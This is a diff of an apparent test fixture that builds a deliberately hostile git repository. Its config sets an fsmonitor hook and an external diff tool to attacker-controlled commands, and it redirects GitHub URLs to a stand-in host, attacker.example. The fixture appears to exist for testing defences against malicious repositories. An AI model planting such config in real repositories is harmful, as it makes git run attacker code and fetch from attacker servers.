@@ -64,7 +64,8 @@ def build_hostile_git_repo(tmp_path: Path) -> HostileGitRepo:
         + f"""
 [core]
 \tfsmonitor = {evil_fsmonitor}
-\tdiff.external = {evil_diff}
+[diff]
+\texternal = {evil_diff}
 [url "https://attacker.example/"]
 \tinsteadOf = https://github.com/
 """,
